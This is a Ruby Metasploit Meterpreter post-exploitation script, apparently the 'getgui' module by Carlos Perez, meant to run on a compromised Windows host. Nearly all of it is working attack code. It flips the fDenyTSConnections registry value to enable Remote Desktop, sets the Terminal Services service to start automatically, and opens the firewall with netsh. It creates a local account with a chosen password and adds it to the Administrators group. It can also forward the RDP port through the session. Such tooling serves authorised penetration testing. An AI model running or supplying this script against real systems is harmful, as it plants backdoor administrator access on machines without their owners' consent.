# $Id$
# $Revision$
# Author: Carlos Perez at carlos_perez[at]darkoperator.com
#-------------------------------------------------------------------------------
################## Variable Declarations ##################

session = client
host_name = client.sys.config.sysinfo['Computer']
# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory,'scripts', 'getgui')

# Create the log directory
::FileUtils.mkdir_p(logs)

# Cleaup script file name
@dest = logs + "/clean_up_" + filenameinfo + ".rc"

@@exec_opts = Rex::Parser::Arguments.new(
	"-h" => [ false, "Help menu." ],
	"-e" => [ false, "Enable RDP only." ],
	"-l" => [ true, "The language switch\n\t\tPossible Options: 'de_DE', 'en_EN' / default is: 'en_EN'" ],
	"-p" => [ true,  "The Password of the user to add." ],
	"-u" => [ true,  "The Username of the user to add." ],
	"-f" => [ true,  "Forward RDP Connection." ]
)
def usage
	print_line("Windows Remote Desktop Enabler Meterpreter Script")
	print_line("Usage: getgui -u <username> -p <password>")
	print_line("Or:    getgui -e")
	print(@@exec_opts.usage)
	raise Rex::Script::Completed
end


def langdetect(lang)
	puts "langdetect"
	if lang != nil
		print_status("Language set by user to: '#{lang}'")
	else
		print_status("Language detection started")
		lang = client.sys.config.sysinfo['System Language']
		if lang != nil
			print_status("\tLanguage detected: #{lang}")
		else
			print_error("\tLanguage detection failed, falling back to default 'en_EN'")
			lang = "en_EN"
		end
	end
rescue::Exception => e
	print_status("The following Error was encountered: #{e.class} #{e}")
end


def enablerd()
	key = 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server'
	value = "fDenyTSConnections"
	begin
		v = registry_getvaldata(key,value)
		print_status "Enabling Remote Desktop"
		if v == 1
			print_status "\tRDP is disabled; enabling it ..."
			registry_setvaldata(key,value,0,"REG_DWORD")
			file_local_write(@dest,"reg setval -k \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" -v 'fDenyTSConnections' -d \"1\"")
		else
			print_status "\tRDP is already enabled"
		end
	rescue::Exception => e
		print_status("The following Error was encountered: #{e.class} #{e}")
	end

end


def enabletssrv()
	rdp_key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\TermService"
	begin
		v2 = registry_getvaldata(rdp_key,"Start")
		print_status "Setting Terminal Services service startup mode"
		if v2 != 2
			print_status "\tThe Terminal Services service is not set to auto, changing it to auto ..."
			service_change_startup("TermService","auto")
			file_local_write(@dest,"execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"")
			cmd_exec("sc start termservice")
			file_local_write(@dest,"execute -H -f cmd.exe -a \"/c sc stop termservice\"")
			
		else
			print_status "\tTerminal Services service is already set to auto"
		end
		#Enabling Exception on the Firewall
		print_status "\tOpening port in local firewall if necessary"
		cmd_exec('netsh firewall set service type = remotedesktop mode = enable')
		file_local_write(@dest,"execute -H -f cmd.exe -a \"/c 'netsh firewall set service type = remotedesktop mode = enable'")
	rescue::Exception => e
		print_status("The following Error was encountered: #{e.class} #{e}")
	end
end



def addrdpusr(session, username, password, lang)
	# Changing the group names depending on the selected language
	case lang
	when "en_EN"
		rdu = "Remote Desktop Users"
		admin = "Administrators"
	when "de_DE"
		rdu = "Remotedesktopbenutzer"
		admin = "Administratoren"
	when "fr_FR"
		rdu = "Utilisateurs du Bureau � distance"
		admin = "Administrateurs"
	end

	print_status "Setting user account for logon"
	print_status "\tAdding User: #{username} with Password: #{password}"
	begin
		cmd_exec("net user #{username} #{password} /add")
		file_local_write(@dest,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
		print_status "\tAdding User: #{username} to local group '#{rdu}'"
		cmd_exec("net localgroup \"#{rdu}\" #{username} /add")
		
		print_status "\tAdding User: #{username} to local group '#{admin}'"
		cmd_exec("net localgroup #{admin}  #{username} /add")
		print_status "You can now login with the created user"
	rescue::Exception => e
		print_status("The following Error was encountered: #{e.class} #{e}")
	end
end


def message
	print_status "Windows Remote Desktop Configuration Meterpreter Script by Darkoperator"
	print_status "Carlos Perez carlos_perez@darkoperator.com"
end
################## MAIN ##################
# Parsing of Options
usr = nil
pass = nil
lang = nil
lport = 1024 + rand(1024)
enbl = nil
frwrd = nil

@@exec_opts.parse(args) { |opt, idx, val|
	case opt
	when "-u"
		usr = val
	when "-p"
		pass = val
	when "-h"
		usage
	when "-l"
		lang = val
	when "-f"
		frwrd = true
		lport = val
	when "-e"
		enbl = true
	end

}
if enbl
	message
	enablerd()
	enabletssrv()
	print_status("For cleanup use command: run multi_console_command -rc #{@dest}")

elsif usr != nil && pass != nil
	message
	langdetect(lang)
	enablerd()
	enabletssrv()
	addrdpusr(session, usr, pass, lang)
	print_status("For cleanup use command: run multi_console_command -rc #{@dest}")

else
	usage
end
if frwrd == true
	print_status("Starting the port forwarding at local port #{lport}")
	client.run_cmd("portfwd add -L 0.0.0.0 -l #{lport} -p 3389 -r 127.0.0.1")
end


